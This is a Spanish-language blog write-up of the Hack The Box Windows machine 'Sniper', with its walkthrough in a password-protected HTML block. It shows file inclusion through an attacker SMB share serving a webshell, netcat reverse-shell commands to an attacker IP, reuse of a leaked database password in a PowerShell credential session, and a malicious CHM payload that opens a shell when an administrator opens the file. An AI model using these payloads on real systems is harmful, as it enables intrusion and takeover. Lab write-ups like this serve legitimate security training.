<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Sniper [Active] :: sckull — HackTheBox Writeups, CTF</title>    
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.  
Javascript needs to be enabled to decrypt content       Nombre Sniper     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.151   Maker MinatoTW &amp;amp; [felamos ][]    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/sniper/" />


<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="shortcut icon" href="/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Sniper [Active] :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.  
Javascript needs to be enabled to decrypt content       Nombre Sniper     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.151   Maker MinatoTW &amp;amp; [felamos ][]    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap." />
<meta name="twitter:site" content="/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="/image/htb/sniper/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Sniper [Active] :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.  
Javascript needs to be enabled to decrypt content       Nombre Sniper     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.151   Maker MinatoTW &amp;amp; [felamos ][]    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap." />
<meta property="og:url" content="/posts/sniper/" />
<meta property="og:site_name" content="Hack The Box - Sniper [Active]" />
<meta property="og:image" content="/image/htb/sniper/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Sniper [Active]",
        "headline" : "Hack The Box - Sniper [Active]",
        "description" : "Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.  
Javascript needs to be enabled to decrypt content       Nombre Sniper     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.151   Maker MinatoTW &amp; [felamos ][]    MASSCAN &amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-01-26 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-01-26 00:00:00 &#43;0000 UTC",
        "url" : "/posts/sniper/",
        "wordCount" : "1719",
        "keywords" : [ "hackthebox","windows","writeup","walkthrough","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-01-26 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Sniper [Active]</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Sunday, Jan 26, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 9 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="/tags/windows/"><li class="fa fa-tag"></li> windows</a>&nbsp;
        
         <a class="button-tag" href="/tags/writeup/"><li class="fa fa-tag"></li> writeup</a>&nbsp;
        
         <a class="button-tag" href="/tags/walkthrough/"><li class="fa fa-tag"></li> walkthrough</a>&nbsp;
        
      </span>
    

    
      
        <img src="/posts/sniper/../../image/htb/sniper/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      
    </div>

    <div class="post-content">      
      <ul>
<li><em>Contenido protegido por contraseña.</em></li>
<li><em>Para desbloquear el contenido debes Ingresar la flag <code>root.txt</code> de la maquina.</em>

<hugo-encrypt>
	
	<div id="hugo-encrypt-encryption-notice">
		<p></p>
		<noscript><span id="hugo-encrypt-enable-js">Javascript needs to be enabled to decrypt content</span></noscript>

		<div class='hugo-encrypt-form'>
			<input
				class="hugo-encrypt-input"
				id="hugo-encrypt-password"
				placeholder=''
			/>
			<input
				class="button"
				type="button"
				value='Enviar '
				id="button" onclick="hugoDecrypt(document.getElementById('hugo-encrypt-password').value,'input')"
			/>
			<div id="hugo-encrypt-input-response"></div>
		</div>
	</div>
	<cipher-text data-password='5624caf363e2750e994f6be0b7436c15' style="display:none;">
		<table>
<thead>
<tr>
<th>Nombre</th>
<th>Sniper</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Windows</td>
</tr>

<tr>
<td>Puntos</td>
<td>30</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.151</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/8308">MinatoTW</a> &amp; [felamos ][]</td>
</tr>
</tbody>
</table>

<h2 id="masscan-nmap">MASSCAN &amp; NMAP</h2>

<p>Escaneo de puertos tcp/udp y servicios con masscan y nmap.</p>

<pre><code class="language-bash">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-15 18:34:38 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.151                                    
Discovered open port 135/tcp on 10.10.10.151                                   
Discovered open port 49667/tcp on 10.10.10.151                                 
Discovered open port 139/tcp on 10.10.10.151

# Nmap 7.80 scan initiated Wed Jan 15 12:30:50 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.151
Nmap scan report for 10.10.10.151
Host is up (0.24s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h01m11s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-01-16T02:36:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 15 12:35:53 2020 -- 1 IP address (1 host up) scanned in 303.66 seconds
</code></pre>

<h2 id="http">HTTP</h2>

<p>En el puerto 80 corriendo IIS con una pagina web.
<img src="../../image/htb/sniper/Screenshot_20200115_124016.png" alt="image" /></p>

<h3 id="gobuster">GOBUSTER</h3>

<p>Escaneo de directorios y archivos con gobuster.</p>

<pre><code class="language-bash">root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q
/Blog (Status: 301)
/blog (Status: 301)
/css (Status: 301)
/images (Status: 301)
/Images (Status: 301)
/index.php (Status: 200)
/Index.php (Status: 200)
/index.php (Status: 200)
/js (Status: 301)
/user (Status: 301)
</code></pre>

<h3 id="blog">/blog/</h3>

<pre><code class="language-bash">root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/blog/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q
/css (Status: 301)
/error.html (Status: 200)
/header.html (Status: 200)
/Index.php (Status: 200)
/index.php (Status: 200)
/index.php (Status: 200)
/js (Status: 301
</code></pre>

<h3 id="user">/user/</h3>

<pre><code class="language-bash">root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/user/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q
/auth.php (Status: 302)
/css (Status: 301)
/db.php (Status: 200)
/DB.php (Status: 200)
/fonts (Status: 301)
/Images (Status: 301)
/images (Status: 301)
/index.php (Status: 302)
/Index.php (Status: 302)
/index.php (Status: 302)
/js (Status: 301)
/login.php (Status: 200)
/Login.php (Status: 200)
/logout.php (Status: 302)
/registration.php (Status: 200)
/vendor (Status: 301)
</code></pre>

<p>Encontramos dos rutas distintas donde estan almacenadas dos paginas diferentes, una donde se muestra un panel de inicio de sesion y la otra nos muestra una pagina con algunos articulos.</p>

<h3 id="user-1">/user/</h3>

<p><img src="../../image/htb/sniper/Screenshot_20200116_200212.png" alt="image" /></p>

<h3 id="blog-1">/blog/</h3>

<p><img src="../../image/htb/sniper/Screenshot_20200116_200252.png" alt="image" /></p>

<h2 id="lfi-rfi-shell-iusr">LFI-RFI -&gt; Shell IUSR</h2>

<p>En la pagina de <code>/blog/</code> encontramos que, al cambiar de idioma se le pasa como parametro un archivo existente a lang, a la pagina.</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_200420.png" alt="image" /></p>

<p>Al realizar una consulta/archivo que no exista en la maquina nos muestra un mensaje de error, esto quiere decir que debe de existir el archivo en la maquina.</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_200840.png" alt="image" /></p>

<p>Intentamos todos los payloads que pudiesen afectar a esta vulnerabilidad pero ninguno funciono, por lo que para explotar esta vulnerabilidad utilizamos un servidor SAMBA para pasarle como parametro una webshell desde nuestra maquina.</p>

<p>Configuracion de Servidor SAMBA:</p>

<pre><code class="language-bash">apt-get install samba
mkdir /var/www/html/pub/ 
chmod 0555 /var/www/html/pub/
chown -R nobody:nogroup /var/www/html/pub/
touch &gt; /etc/samba/smb.conf
</code></pre>

<p>/etc/samba/smb.conf:</p>

<pre><code class="language-bash">[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = indishell-lab
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[test]
path = /var/www/html/pub
writable = yes
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
</code></pre>

<pre><code>service smbd restart 
</code></pre>

<p>Acceder a:</p>

<pre><code>\\10.10.10.10\test\
</code></pre>

<p>La webshell que utilizamos es <a href="https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php">WhiteWinterWolf - Webshell</a>. Una vez terminado nuestra configuracion le pasamos a la pagina nuestra IP junto con el SHARENAME y la webshell, y logramos ejecuar comandos con el usuario IUSR.</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_201844.png" alt="image" /></p>

<p>Ahora que podemos ejecutar comandos vamos a obtener una shell inversa utilizando netcat (nc.exe) en la misma carpeta donde colocamos nuestra webshell. Utilizamos el siguiente comando:</p>

<pre><code class="language-bash">\\10.10.15.244\test\nc.exe -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 10.10.15.244 443
</code></pre>

<p><img src="../../image/htb/sniper/Screenshot_20200116_202318.png" alt="image" /></p>

<p>Obtenemos una shell con el usuario IUSR.</p>

<h2 id="user-chris">USER - Chris</h2>

<p>Enumeramos los archivos que se encuentran en ambas paginas (blog, user) y encontramos en user un archivo de php en el que se encuentran las credenciales para la base de datos.</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_202509.png" alt="image" /></p>

<p>Credenciales:</p>

<pre><code class="language-bash">Host, User, Password, DB
&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;
</code></pre>

<p>Dentro de las carpetas de Usuarios (C:\Users) encontramos a Chris como uno de los usuarios, utilizamos la contraseña de la base de datos con el usuario Chris para verificar que tenga permisos de escritura en la maquina atraves de samba con smbmap.</p>

<pre><code class="language-bash">[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.151...
[+] IP: 10.10.10.151:445	Name: 10.10.10.151                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	.                                                  
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 17:57:56 1600	lsass
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	scerpc
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-368-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	epmapper
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-1e4-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	eventlog
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-408-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	atsvc
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-598-0
	fr--r--r--                4 Sun Dec 31 17:57:56 1600	wkssvc
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	spoolss
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-a2c-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	trkwks
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	W32TIME_ALT
	fr--r--r--                4 Sun Dec 31 17:57:56 1600	srvsvc
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	vgauth-service
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-270-0
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-284-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	ROUTER
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PSHost.132236907993416575.1908.DefaultAppDomain.powershell
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	iisipmbed63cd4-5a7a-4011-8a3f-7ca5d2834ac3
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	iislogpipe3e6fd272-542c-4985-87e5-bd930a7401e4
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PSHost.132237251159401733.1252.DefaultAppDomain.powershell
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PSHost.132237268742138566.1496.DefaultAppDomain.wsmprovhost
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	IISFCGI-3e6bfe08-4ed8-4e32-97ff-7c49438ccb63
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	IISFCGI-0587ff21-c423-47bb-872e-34f067d827a9
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PSHost.132237302290243128.4168.DefaultAppDomain.powershell
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PSHost.132237304828945308.4400.DefaultAppDomain.powershell
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PSHost.132237305109360308.5580.DefaultAppDomain.wsmprovhost
	IPC$                                              	READ ONLY	Remote IPC
</code></pre>

<p>Vemos que Chris tiene permisos de escritura y lectura en (.) la maquina. Intentamos utilizar smbclient y los modulos de metasploit para samba pero ninguno de ellos sirvio para obtener una shell. Por lo que utilizamos la misma tecnica que utilizamos con la maquina <a href="https://sckull.github.io/posts/arkham/#user-batman"><strong>Arkham de HackTheBox</strong></a> en la que utilizamos las credenciales para obtener una sesion nueva utilizando powershell.</p>

<pre><code class="language-powershell">$username =&quot;Sniper\Chris&quot;;
$password = convertto-securestring -AsPlainText -Force -String &quot;36mEAhz/B8xQ~2VM&quot;; 
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; 
New-PSSession -Credential $cred | Enter-PSSession
</code></pre>

<p>Al ejecutar estos comandos nos muestra una shell en localhost con el usuario Chris, pero, no podemos saltar hacia otras carpetas.</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_203242.png" alt="image" /></p>

<p>Para obtener una shell con el usuario Chris utilizamos el mismo comando que utilizamos para obtener una shell con IUSR.</p>

<pre><code class="language-bash">\\10.10.15.244\test\nc.exe -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 10.10.15.244 448
</code></pre>

<p>Obtenemos una shell y nuestra flag <strong>user.txt</strong>.</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_203433.png" alt="image" /></p>

<h2 id="privilege-escalation-ctf-like-malicious-chm-file">Privilege Escalation (CTF Like) - Malicious CHM file</h2>

<p>Enumeramos los directorios de Chris, vemos un archivo chm el cual se encuentra en <code>C:\Users\Chris\Downloads</code> llamado instructions.chm.</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_203728.png" alt="image" /></p>

<p>Al abrirlo en Windows nos muestra un mensaje.</p>

<pre><code>Pff... This dumb CEO always makes me do all the shitty work. SMH!
I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him.
</code></pre>

<p><img src="../../image/htb/sniper/Screenshot_20200116_203803.png" alt="image" /></p>

<p>De igual forma encontramos una nota en <code>C:\Docs</code> y un PDF.</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_203938.png" alt="image" /></p>

<p>php for dummies-trial.pdf:</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_204057.png" alt="image" /></p>

<pre><code class="language-bash">note.txt:
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
</code></pre>

<p>Vemos claramente en la nota que, Chris debe de reparar los bugs que existen en la pagina, luego de eso realizar la documentacion (instructions.chm al parecer) y dejarlos en la misma carpeta que la nota.</p>

<p>Copiamos el archivo instructions.chm en C:\Docs y despues de un tiempo el archivo desaparece, por lo que asumimos que es eliminado o revisado por el CEO (&ldquo;Administrador&rdquo;).</p>

<p>Creamos un archivo CHM el cual contenga un comando para obtener una shell inversa, utilizamos &ldquo;Microsoft HTML Help Workshop and Documentation&rdquo; para generarlo.</p>

<p>Agregamos al archivo principal nuestro siguiente payload entre la etiqueta BODY:</p>

<pre><code class="language-xml">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;
  &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;
  &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;
  &lt;PARAM name=&quot;Item1&quot; value=',cmd.exe,/c C:\Users\Chris\Documents\nc.exe 10.10.15.244 449 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'&gt;
  &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
</code></pre>

<p>Trasladamos nuestro archivo a la carpeta <code>C:\Docs</code>, netcat (nc.exe) y esperamos a que nuestro payload sea ejecutado:</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_210525.png" alt="image" /></p>

<p>Obtenemos nuestra shell con permisos de administrador y nuestra flag <strong>root.txt</strong>.</p>

<p><img src="../../image/htb/sniper/Screenshot_20200116_211231.png" alt="image" /></p>

	</cipher-text>
	<style type="text/css">
		div#hugo-encrypt-sha1sum {display: none;}
		button, .button{  
			align-items: center;
			justify-content: center;
			padding: 8px 18px;
			margin-bottom: 5px;
			background: var(--dark-background-secondary);
			color: inherit;
			text-decoration: none;
			text-align: center;
			font-weight: 500;
			border-radius: 8px;
			border: 1px solid transparent;
			appearance: none;
			cursor: pointer;
			outline: none;
		  }
	</style>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/sha1.js"></script>
	<script>
		
		let cipher = document.getElementsByTagName("cipher-text")[0];
		const storageKey = location.pathname + "password";
		const userStorage =  window['sessionStorage'] ;
		

		function str2buf(str) {
			return new TextEncoder("utf-8").encode(str);
		}
		

		function buf2str(buffer) {
			return new TextDecoder("utf-8").decode(buffer);
		}
		

		function hex2buf(hexStr) {
			return new Uint8Array(hexStr.match(/.{2}/g).map(h => parseInt(h, 16)));
		}
		

		function deriveKey(passphrase, salt) {
			salt = salt || crypto.getRandomValues(new Uint8Array(8));
			return crypto.subtle
				.importKey("raw", str2buf(passphrase), "PBKDF2", false, ["deriveKey"])
				.then(key =>
					crypto.subtle.deriveKey(
						{ name: "PBKDF2", salt, iterations: 1000, hash: "SHA-256" },
						key,
						{ name: "AES-GCM", length: 256 },
						false,
						["encrypt", "decrypt"],
					),
				)
				.then(key => [key, salt]);
		}
		

		function decrypt(passphrase, saltIvCipherHex) {
			const [salt, iv, data] = saltIvCipherHex.split("-").map(hex2buf);
			return deriveKey(passphrase, salt)
				.then(([key]) => crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data))
				.then(v => buf2str(new Uint8Array(v)));
		}
		

		const hugoDecrypt = function(password, type) {
				decrypt(password, cipher.innerText).then(function(decrypted_text) {
					

					let hash = CryptoJS.SHA1(decrypted_text.replace(/\r?\n?[^\r\n]*$/, ""));
					let sha1_sum = CryptoJS.enc.Hex.stringify(hash);

					if ( decrypted_text.includes(sha1_sum) ) {
						document.getElementById("hugo-encrypt-encryption-notice").remove();
						cipher.outerHTML = decrypted_text;
						userStorage.setItem(storageKey, password);
						document.getElementById("hugo-encrypt-sha1sum").innerHTML = "Success: " + sha1_sum;
						$('pre').addClass('code-toolbar language-bash');
						$('code').addClass('language-bash');
                        console.log("Decryption successful. Storing password in sessionStorage.");
					}
					}).catch(function(error) {
                    if (type === "input") {
                        document.getElementById("hugo-encrypt-input-response").innerHTML = "";
                        console.log('', error);
                    } else if (type === "storage") {
                        userStorage.removeItem(location.pathname + "password");
                        console.log("Password changed. Clearing userStorage.", error);
                    }
                });
			};
	</script>
	<script>
		window.onload = () => {
			if (userStorage.getItem(storageKey)) {
				console.log("Found storageKey in userStorage. Attemtping decryption");
				hugoDecrypt(userStorage.getItem(storageKey), "storage");
			}
		};
	</script>
</hugo-encrypt>

</li>
</ul>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="/posts/resolute/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Resolute [Active]</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="/posts/bitlab/">
                <span class="button__text">Hack The Box - Bitlab</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
